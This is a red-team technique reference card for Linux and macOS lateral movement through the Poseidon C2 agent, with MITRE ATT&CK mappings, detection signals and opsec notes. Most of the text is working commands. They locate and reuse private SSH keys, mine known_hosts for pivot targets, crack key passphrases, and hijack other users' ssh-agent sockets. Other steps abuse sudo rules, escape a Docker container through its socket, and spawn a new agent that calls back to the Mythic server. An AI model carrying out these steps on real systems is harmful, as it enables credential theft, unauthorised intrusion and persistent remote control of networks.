---
name: Linux Lateral Movement Techniques
category: lateral-movement
subcategories: [ssh-lateral, key-reuse, known-hosts, sudo-lateral, linux]
tradecraft_tags: [linux, lateral-movement, ssh, key-reuse, known-hosts, poseidon, technique]
mitre_attack:
  - id: T1021.004
    name: Remote Services — SSH
  - id: T1552.004
    name: Unsecured Credentials — Private Keys
source:
  url: https://attack.mitre.org/techniques/T1021/004/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [linux, macos]
architecture: [x64]
privilege_required: user
network_required: true
detection_signal: |
  SSH connections generate authentication events in /var/log/auth.log (Linux) and
  system.log (macOS). Unusual SSH source IPs (inside-network pivot patterns) are
  anomalous — most SSH in enterprise comes from jump servers. Key-based auth (successful)
  generates Event with key fingerprint in auth.log.
usage_examples:
  - description: Use discovered SSH key to pivot to another host
    args: "ssh -i /home/user/.ssh/id_rsa user@TARGET_HOST"
  - description: SSH agent forwarding (use existing agent connection)
    args: "ssh -A user@TARGET_HOST"
  - description: Spawn new Poseidon agent on target via SSH
    args: "(Poseidon) ssh_spawn target_host username /path/to/key"
  - description: Execute command on target via SSH
    args: "(Poseidon) ssh_exec target_host username /path/to/key 'whoami'"
  - description: Check known_hosts for SSH targets
    args: "cat ~/.ssh/known_hosts; cat /home/*/.ssh/known_hosts 2>/dev/null"
  - description: Scan for SSH hosts based on known_hosts IPs
    args: "grep -h -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ~/.ssh/known_hosts | sort -u"
opsec_notes: |
  SSH lateral movement via discovered keys is stealthy from the source perspective —
  it's an authorized key-based authentication. The detection signal is on the target
  (auth.log shows the key fingerprint used). Key reuse across multiple hosts (same
  private key used everywhere) is common in real environments and makes this technique
  particularly effective. Poseidon's ssh_spawn provides the cleanest path: it spawns
  a new Poseidon agent on the target and callbacks to Mythic.
gotchas: |
  SSH key-based authentication requires:
  1. A private key file (id_rsa, id_ed25519, etc.)
  2. The corresponding public key in ~/.ssh/authorized_keys on the target
  The ~/.ssh/known_hosts file reveals what hosts a user has previously connected to —
  excellent pivot map. Private keys may have passphrases — detect via `ssh-keygen -y -f key`
  (will prompt for passphrase if set). Passphrases require cracking or other bypass.
related_ttps: [poseidon, linux-credential-hunting, linux-privesc, sharphound]
alternatives: [poseidon-ssh-spawn, impacket-ssh, crackmapexec-ssh]
common_args: {}
last_updated: 2026-05-29
---

# Linux Lateral Movement Techniques

A reference for post-foothold lateral movement on Linux/macOS targets via Poseidon.
SSH key reuse is the primary Linux lateral movement primitive — SSH keys are frequently
shared across multiple servers and rarely rotated.

## SSH Lateral Movement Chain

```
1. Find SSH keys:
   find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
   cat ~/.ssh/known_hosts                    # what hosts does this user trust?
   cat ~/.ssh/config                         # SSH aliases and key mappings

2. Map known_hosts to pivot targets:
   grep -h -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' ~/.ssh/known_hosts

3. Test key against discovered hosts:
   ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@TARGET whoami

4. Spawn Poseidon agent on target:
   (Poseidon) ssh_spawn TARGET_IP username /home/user/.ssh/id_rsa
```

## Key Passphrase Detection and Bypass

```bash
# Test if key has passphrase:
ssh-keygen -y -f id_rsa   # Will prompt for passphrase if set; output public key if none

# If passphrase-protected:
# Option 1: Offline crack with John/hashcat:
ssh2john id_rsa > id_rsa.hash; john --wordlist=rockyou.txt id_rsa.hash

# Option 2: Look for key in ssh-agent (if agent is running):
SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.XXXX ssh-add -l   # List loaded keys
```

## SSH Agent Hijacking

If a user has an active SSH agent socket:
```bash
# Find agent sockets:
find /tmp -name "agent.*" 2>/dev/null

# If another user's agent socket is readable (requires root or same-user):
SSH_AUTH_SOCK=/tmp/ssh-xxxx/agent.XXXX ssh-add -l           # List their loaded keys
SSH_AUTH_SOCK=/tmp/ssh-xxxx/agent.XXXX ssh user@TARGET      # Connect using their identity
```

## Sudo for Lateral Movement

If sudo allows running commands as specific users (not just root):
```bash
sudo -l
# Example: (operator) NOPASSWD: /usr/bin/ssh
# Exploit: sudo -u operator ssh -i /operator/.ssh/id_rsa user@TARGET
```

## Docker Escape → Host Access

If running inside a Docker container with the Docker socket mounted:
```bash
ls -la /var/run/docker.sock   # If accessible, escape to host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Poseidon-Specific Workflow

```
# Full lateral movement workflow via Poseidon:
shell: cat ~/.ssh/known_hosts                          # Map targets
shell: find / -name 'id_rsa' 2>/dev/null              # Find keys
ssh_exec: TARGET_IP username /path/key "id"            # Test access
ssh_spawn: TARGET_IP username /path/key                # Spawn new agent
```
